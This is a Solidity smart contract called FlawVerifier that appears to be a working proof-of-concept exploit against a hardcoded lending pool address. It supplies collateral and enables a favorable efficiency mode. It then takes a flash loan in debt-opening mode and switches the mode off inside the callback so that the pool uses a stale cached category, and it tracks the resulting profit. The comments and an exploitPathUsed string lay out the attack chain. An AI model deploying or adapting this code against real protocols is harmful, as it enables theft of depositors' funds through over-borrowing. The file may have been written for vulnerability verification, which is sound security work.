```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
}

interface IPriceOracleGetterMinimal {
  function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderMinimal {
  function getPriceOracle() external view returns (address);
}

interface IFlashLoanReceiverMinimal {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function POOL() external view returns (IPoolMinimal);
}

interface IPoolMinimal {
  struct ReserveConfigurationMap {
    uint256 data;
  }

  struct ReserveData {
    ReserveConfigurationMap configuration;
    uint128 liquidityIndex;
    uint128 currentLiquidityRate;
    uint128 variableBorrowIndex;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    uint16 id;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint128 accruedToTreasury;
    uint128 unbacked;
    uint128 isolationModeTotalDebt;
  }

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function getReservesList() external view returns (address[] memory);
  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
  function getReserveData(address asset) external view returns (ReserveData memory);
  function getUserEMode(address user) external view returns (uint256);
  function getUserAccountData(
    address user
  )
    external
    view
    returns (
      uint256 totalCollateralBase,
      uint256 totalDebtBase,
      uint256 availableBorrowsBase,
      uint256 currentLiquidationThreshold,
      uint256 ltv,
      uint256 healthFactor
    );

  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
  function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external;
  function setUserEMode(uint8 categoryId) external;
  function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata interestRateModes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

contract FlawVerifier is IFlashLoanReceiverMinimal {
  uint256 private constant VARIABLE_RATE_MODE = 2;
  uint256 private constant LTV_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000;
  uint256 private constant DECIMALS_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFF;
  uint256 private constant ACTIVE_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFF;
  uint256 private constant BORROWING_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFF;
  uint256 private constant PAUSED_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFF;
  uint256 private constant EMODE_CATEGORY_MASK =
    0xFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
  uint256 private constant DEBT_CEILING_MASK =
    0xF0000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

  address private constant TARGET_POOL = 0xfD11AbA71c06061F446ADe4eec057179F19C23C4;

  struct AssetConfig {
    uint256 raw;
    uint256 ltv;
    uint256 decimals;
    uint256 eModeCategory;
    uint256 debtCeiling;
    bool active;
    bool borrowingEnabled;
    bool paused;
  }

  struct Plan {
    bool found;
    address collateralAsset;
    address borrowAsset;
    uint256 collateralAmount;
    uint256 borrowAmount;
    uint256 borrowAmountBase;
    uint256 normalAvailableBorrowsBase;
    uint256 eModeAvailableBorrowsBase;
    uint8 category;
  }

  IPoolMinimal public immutable override POOL;
  IPoolAddressesProviderMinimal public immutable override ADDRESSES_PROVIDER;

  bool public attempted;
  bool public callbackTriggered;
  bool public hypothesisValidated;
  address public selectedCollateralAsset;
  address public selectedBorrowAsset;
  uint8 public selectedCategory;
  uint256 public selectedCollateralAmount;
  uint256 public selectedBorrowAmount;
  uint256 public selectedBorrowAmountBase;
  uint256 public normalAvailableBorrowsBaseBefore;
  uint256 public emodeAvailableBorrowsBaseBefore;
  uint256 public finalHealthFactor;
  address private _profitToken;
  uint256 private _profitAmount;
  uint256 private _profitBalanceBefore;
  string public lastFailureReason;

  constructor() {
    POOL = IPoolMinimal(TARGET_POOL);
    ADDRESSES_PROVIDER = IPoolMinimal(TARGET_POOL).ADDRESSES_PROVIDER();
  }

  function executeOnOpportunity() external {
    if (attempted) {
      return;
    }
    attempted = true;
    lastFailureReason = "";

    address[] memory reserves = POOL.getReservesList();
    if (reserves.length == 0) {
      lastFailureReason = "pool has no listed reserves";
      return;
    }

    uint256 suppliedCategoryMask = _supplyVerifierHeldCollateral(reserves);
    if (suppliedCategoryMask == 0) {
      // Concrete infeasibility for the strict attack path on a fresh verifier:
      // without pre-held qualifying collateral, the verifier cannot first enable a favorable eMode category.
      // Bootstrapping that collateral solely from the same flashLoan debt-opening path would add matching debt
      // on the flash-loaned collateral and does not create a net-borrowable position without introducing an
      // unrelated route, which this verifier intentionally avoids.
      lastFailureReason = "verifier holds no qualifying non-isolated eMode collateral";
      return;
    }

    (uint256 normalAvailableBorrowsBase, ) = _setModeAndReadAccountData(0);
    Plan memory plan = _findBestPlan(reserves, suppliedCategoryMask, normalAvailableBorrowsBase);
    if (!plan.found) {
      lastFailureReason =
        "no same-category borrow asset can exceed normal-mode borrow power with current verifier-held collateral";
      return;
    }

    selectedCollateralAsset = plan.collateralAsset;
    selectedBorrowAsset = plan.borrowAsset;
    selectedCollateralAmount = plan.collateralAmount;
    selectedBorrowAmount = plan.borrowAmount;
    selectedBorrowAmountBase = plan.borrowAmountBase;
    normalAvailableBorrowsBaseBefore = plan.normalAvailableBorrowsBase;
    emodeAvailableBorrowsBaseBefore = plan.eModeAvailableBorrowsBase;
    selectedCategory = plan.category;

    if (!_setUserEMode(plan.category)) {
      lastFailureReason = "failed to enable chosen eMode category";
      return;
    }

    _profitToken = plan.borrowAsset;
    _profitBalanceBefore = IERC20Minimal(plan.borrowAsset).balanceOf(address(this));

    address[] memory assets = new address[](1);
    assets[0] = plan.borrowAsset;
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = plan.borrowAmount;
    uint256[] memory modes = new uint256[](1);
    modes[0] = VARIABLE_RATE_MODE;

    (bool ok, ) = address(POOL).call(
      abi.encodeWithSelector(
        IPoolMinimal.flashLoan.selector,
        address(this),
        assets,
        amounts,
        modes,
        address(this),
        abi.encode(plan.category),
        uint16(0)
      )
    );
    if (!ok) {
      _profitToken = address(0);
      _profitBalanceBefore = 0;
      lastFailureReason = "flashLoan debt opening failed under current on-chain conditions";
      return;
    }

    _profitAmount = IERC20Minimal(plan.borrowAsset).balanceOf(address(this)) - _profitBalanceBefore;
    (, , , , , finalHealthFactor) = POOL.getUserAccountData(address(this));

    if (
      callbackTriggered &&
      POOL.getUserEMode(address(this)) == 0 &&
      plan.borrowAmountBase > plan.normalAvailableBorrowsBase &&
      _profitAmount > 0
    ) {
      hypothesisValidated = true;
    }
  }

  function executeOperation(
    address[] calldata,
    uint256[] calldata,
    uint256[] calldata,
    address initiator,
    bytes calldata params
  ) external override returns (bool) {
    if (msg.sender != address(POOL) || initiator != address(this)) {
      lastFailureReason = "unexpected flashLoan callback caller";
      return false;
    }

    callbackTriggered = true;
    uint8 category = abi.decode(params, (uint8));
    if (category == 0) {
      lastFailureReason = "invalid callback category";
      return false;
    }

    // Strict exploit-path step:
    // 1. The verifier enabled a favorable eMode before calling flashLoan.
    // 2. During the receiver callback, it disables eMode.
    // 3. The pool then continues debt opening using the stale pre-callback category.
    if (!_setUserEMode(0)) {
      lastFailureReason = "failed to disable eMode inside flashLoan callback";
      return false;
    }

    return true;
  }

  function profitToken() external view returns (address) {
    return _profitToken;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function exploitPathUsed() external pure returns (string memory) {
    return
      "existing verifier-held collateral -> enable favorable eMode -> flashLoan(receiver=self,onBehalfOf=self,mode=variable) -> setUserEMode(0) in executeOperation -> stale cached eMode used for debt opening";
  }

  function _supplyVerifierHeldCollateral(address[] memory reserves) internal returns (uint256 categoryMask) {
    for (uint256 i = 0; i < reserves.length; ++i) {
      address asset = reserves[i];
      if (asset == address(0)) {
        continue;
      }

      AssetConfig memory cfg = _readAssetConfig(asset);
      if (
        cfg.eModeCategory == 0 ||
        cfg.ltv == 0 ||
        !cfg.active ||
        cfg.paused ||
        cfg.debtCeiling != 0
      ) {
        continue;
      }

      uint256 bal = IERC20Minimal(asset).balanceOf(address(this));
      if (bal == 0) {
        continue;
      }

      if (!_approveIfNeeded(asset, address(POOL), bal)) {
        continue;
      }

      (bool ok, ) = address(POOL).call(
        abi.encodeWithSelector(IPoolMinimal.supply.selector, asset, bal, address(this), uint16(0))
      );
      if (!ok) {
        continue;
      }

      categoryMask |= (uint256(1) << cfg.eModeCategory);
    }
  }

  function _findBestPlan(
    address[] memory reserves,
    uint256 suppliedCategoryMask,
    uint256 normalAvailableBorrowsBase
  ) internal returns (Plan memory best) {
    for (uint8 category = 1; category < type(uint8).max; ++category) {
      if ((suppliedCategoryMask & (uint256(1) << category)) == 0) {
        continue;
      }

      (uint256 emodeAvailableBorrowsBase, bool modeSet) = _setModeAndReadAccountData(category);
      if (!modeSet) {
        continue;
      }
      if (emodeAvailableBorrowsBase <= normalAvailableBorrowsBase) {
        continue;
      }

      for (uint256 i = 0; i < reserves.length; ++i) {
        address borrowAsset = reserves[i];
        if (borrowAsset == address(0)) {
          continue;
        }

        (uint256 candidateAmount, uint256 candidateBase) = _quoteBorrowCandidate(
          borrowAsset,
          category,
          normalAvailableBorrowsBase,
          emodeAvailableBorrowsBase
        );
        if (candidateBase <= best.borrowAmountBase) {
          continue;
        }

        best.found = true;
        (best.collateralAsset, best.collateralAmount) = _pickCollateralAssetForCategory(
          reserves,
          category
        );
        best.borrowAsset = borrowAsset;
        best.borrowAmount = candidateAmount;
        best.borrowAmountBase = candidateBase;
        best.normalAvailableBorrowsBase = normalAvailableBorrowsBase;
        best.eModeAvailableBorrowsBase = emodeAvailableBorrowsBase;
        best.category = category;
      }
    }

    _setUserEMode(0);
  }

  function _quoteBorrowCandidate(
    address borrowAsset,
    uint8 category,
    uint256 normalAvailableBorrowsBase,
    uint256 emodeAvailableBorrowsBase
  ) internal view returns (uint256 candidateAmount, uint256 candidateBase) {
    AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
    if (
      borrowCfg.eModeCategory != category ||
      !borrowCfg.borrowingEnabled ||
      !borrowCfg.active ||
      borrowCfg.paused
    ) {
      return (0, 0);
    }

    IPoolMinimal.ReserveData memory reserveData = POOL.getReserveData(borrowAsset);
    uint256 liquidity = IERC20Minimal(borrowAsset).balanceOf(reserveData.aTokenAddress);
    if (liquidity == 0) {
      return (0, 0);
    }

    uint256 price = IPriceOracleGetterMinimal(ADDRESSES_PROVIDER.getPriceOracle()).getAssetPrice(
      borrowAsset
    );
    if (price == 0) {
      return (0, 0);
    }

    uint256 unit = 10 ** borrowCfg.decimals;
    uint256 normalTokenMax = (normalAvailableBorrowsBase * unit) / price;
    uint256 emodeTokenMax = (emodeAvailableBorrowsBase * unit) / price;
    uint256 maxBorrowable = emodeTokenMax < liquidity ? emodeTokenMax : liquidity;
    if (maxBorrowable <= normalTokenMax) {
      return (0, 0);
    }

    uint256 gap = maxBorrowable - normalTokenMax;
    candidateAmount = normalTokenMax + (gap * 3) / 4;
    if (candidateAmount <= normalTokenMax) {
      candidateAmount = normalTokenMax + 1;
    }
    if (candidateAmount > maxBorrowable) {
      candidateAmount = maxBorrowable;
    }
    if (candidateAmount <= normalTokenMax || candidateAmount == 0) {
      return (0, 0);
    }

    candidateBase = (candidateAmount * price) / unit;
  }

  function _pickCollateralAssetForCategory(
    address[] memory reserves,
    uint8 category
  ) internal view returns (address picked, uint256 pickedAmount) {
    uint256 bestATokenBalance;
    for (uint256 i = 0; i < reserves.length; ++i) {
      address asset = reserves[i];
      if (asset == address(0)) {
        continue;
      }
      AssetConfig memory cfg = _readAssetConfig(asset);
      if (cfg.eModeCategory != category || cfg.ltv == 0 || cfg.debtCeiling != 0) {
        continue;
      }
      address aToken = POOL.getReserveData(asset).aTokenAddress;
      uint256 bal = IERC20Minimal(aToken).balanceOf(address(this));
      if (bal > bestATokenBalance) {
        bestATokenBalance = bal;
        picked = asset;
        pickedAmount = bal;
      }
    }
  }

  function _setModeAndReadAccountData(
    uint8 category
  ) internal returns (uint256 availableBorrowsBase, bool ok) {
    if (!_setUserEMode(category)) {
      return (0, false);
    }
    (, , availableBorrowsBase, , , ) = POOL.getUserAccountData(address(this));
    return (availableBorrowsBase, true);
  }

  function _setUserEMode(uint8 category) internal returns (bool) {
    (bool ok, ) = address(POOL).call(
      abi.encodeWithSelector(IPoolMinimal.setUserEMode.selector, category)
    );
    return ok;
  }

  function _approveIfNeeded(address token, address spender, uint256 amount) internal returns (bool) {
    uint256 current = IERC20Minimal(token).allowance(address(this), spender);
    if (current >= amount) {
      return true;
    }

    if (current != 0 && !_safeApprove(token, spender, 0)) {
      return false;
    }

    return _safeApprove(token, spender, type(uint256).max);
  }

  function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
    (bool ok, bytes memory ret) = token.call(
      abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
    );
    return ok && (ret.length == 0 || abi.decode(ret, (bool)));
  }

  function _readAssetConfig(address asset) internal view returns (AssetConfig memory cfg) {
    cfg.raw = POOL.getConfiguration(asset).data;
    cfg.ltv = cfg.raw & ~LTV_MASK;
    cfg.decimals = (cfg.raw & ~DECIMALS_MASK) >> 48;
    cfg.active = (cfg.raw & ~ACTIVE_MASK) != 0;
    cfg.borrowingEnabled = (cfg.raw & ~BORROWING_MASK) != 0;
    cfg.paused = (cfg.raw & ~PAUSED_MASK) != 0;
    cfg.eModeCategory = (cfg.raw & ~EMODE_CATEGORY_MASK) >> 168;
    cfg.debtCeiling = (cfg.raw & ~DEBT_CEILING_MASK) >> 212;
  }
}

